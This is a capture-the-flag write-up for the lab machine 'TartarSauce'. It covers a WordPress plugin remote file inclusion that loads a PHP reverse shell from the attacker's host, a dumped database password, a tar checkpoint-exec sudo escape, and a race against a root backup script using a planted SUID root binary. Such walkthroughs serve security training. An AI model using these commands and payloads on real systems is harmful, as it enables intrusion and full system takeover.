# TartarSauce

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.1.185
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 10:29 EDT
Nmap scan report for 10.129.1.185
Host is up (0.016s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
```

### Directory Enumeration

The web page only shows this:

<figure><img src="../../../.gitbook/assets/image (1143).png" alt=""><figcaption></figcaption></figure>

I checked for `robots.txt`, which is quite common for old machines.&#x20;

```
$ curl http://10.129.1.185/robots.txt
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

Seems like there are a lot of different services being run here. I ran a `gobuster` scan on the `/webservices` directory still, in case I missed anything.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.1.185/webservices -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.185/webservices
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/02 10:34:16 Starting gobuster in directory enumeration mode
===============================================================
/wp                   (Status: 301) [Size: 321] [-> http://10.129.1.185/webservices/wp/]
```

It seems that `robots.txt` left this Wordpress site out. Let's investigate that first then.

### Wordpress

This was a basic Wordpress site with nothing on it. We can run a `wpscan` with the API token to enumerate all the plugins, themes and what not. There are some plugins that are vulnerable:

{% code overflow="wrap" %}
```
$ wpscan --api-token <TOKEN> --url http://10.129.1.185/webservices/wp/ --enumerate p,t,u --plugins-detection aggressive

[+] akismet
 | Location: http://10.129.85.106/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2023-04-05T10:17:00.000Z
 | Readme: http://10.129.85.106/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.85.106/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.85.106/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.85.106/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] gwolle-gb
 | Location: http://10.129.85.106/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2023-03-24T11:05:00.000Z
 | Readme: http://10.129.85.106/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.5.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.85.106/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Gwolle Guestbook <= 2.5.3 - Cross-Site Scripting (XSS)
 |     Fixed in: 2.5.4
 |     References:
 |      - https://wpscan.com/vulnerability/00c33bf2-1527-4276-a470-a21da5929566
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17884
 |      - https://seclists.org/fulldisclosure/2018/Jul/89
 |      - https://www.defensecode.com/advisories/DC-2018-05-008_WordPress_Gwolle_Guestbook_Plugin_Advisory.pdf
 |      - https://plugins.trac.wordpress.org/changeset/1888023/gwolle-gb
 |
 | [!] Title: Gwolle Guestbook < 4.2.0 - Reflected Cross-Site Scripting
 |     Fixed in: 4.2.0
 |     References:
 |      - https://wpscan.com/vulnerability/e50bcb39-9a01-433f-81b3-fd4018672b85
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24980
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.85.106/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.85.106/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```
{% endcode %}

We can search for exploits for these two plugins.&#x20;

```
$ searchsploit gwolle                 
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Incl | php/webapps/38861.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There was only this to exploit, so let's try it. This exploit works by accessing this link for an RFI:

<pre data-overflow="wrap"><code><strong>http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
</strong></code></pre>

We can grab a PHP reverse shell from PentestMonkey and rename it to `wp-load.php` and use this RFI to execute it.

```bash
$ curl http://10.129.85.109/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.13/
```

<figure><img src="../../../.gitbook/assets/image (3994).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SQL Creds

Now that we have access, we can take a look at the `wp-config.php` file to find some DB credentials:

```
define('DB_NAME', 'wp');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

However, the database has nothing to offer and the hashed passwords cannot be cracked.&#x20;

### Sudo Privileges

Checking `sudo` privileges, it seems we can run `tar` as the user `onuma`.&#x20;

```
www-data@TartarSauce:/var/www/html/webservices/wp$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

From GTFOBins, we can use this command to get a shell as the user:

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<figure><img src="../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

We can now grab the user flag.&#x20;

### Backuperer

I ran LinPEAS to enumerate further for me, which found a few possible leads but it all led to dead ends. I then ran `pspy32` to double check on processes by all users. This was when I saw this process:

```
2023/05/02 11:14:41 CMD: UID=0    PID=23714  | /bin/bash /usr/sbin/backuperer 
2023/05/02 11:14:41 CMD: UID=0    PID=23719  | /bin/sleep 30
```

There's a program `backuperer` being run by `root` periodically. This was actually a `bash` script, and here's its contents:

```bash
onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

This script, as the name suggests, backups the `/var/www/html` directory via `tar`, and the weird part is that the `root` user uses tar as `onama` then it has a `sleep` function for whatever reason before the file is deleted. This means that the file is left there for us to alter.

So, what we can do is create a `tar` file that has sn SUID binary for us. This works because `tar` files preserve the permission they have been given, so an SUID binary by `root` on my machine would be the same on the other machine. We just need to slot it within the time frame.

First, create an SUID binary using some C code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main (void){
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

Afterwards, we can compile this and make it an SUID binary.

```bash
gcc -m32 -o suid suid.c
sudo chown root.root -R /tmp/var
sudo chmod 4755 suid
sudo rm suid.c
```

Then, move this into `/tmp/var/www/html` and `tar` the entire folder.

```bash
$ tar -zcvf suid.tar.gz var/
var/
var/www/
var/www/html/
var/www/html/suid
```

Transfer this to the victim machine. Afterwards, head to the `/var/tmp` folder and wait for the backup file to appear. It should be something like `.e105819...`. Then we just need to copy the contents of our malicious `tar` file, overwriting the original backup file.

```bash
cp /tmp/suid.tar.gz .25388a3009d9ee5b7ae704e609c726e46647f748
```

Then, we can view the `/var/tmp/check/var/www/html` folder to find our SUID binary:

```
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
total 24
drwxr-xr-x 2 onuma onuma  4096 May  2 11:33 .
drwxr-xr-x 3 onuma onuma  4096 May  2 11:30 ..
-rwsr-xr-x 1 root root 15020 May  2 11:32 suid
```

Then just execute it and it we would get a `root` shell. Rooted!&#x20;
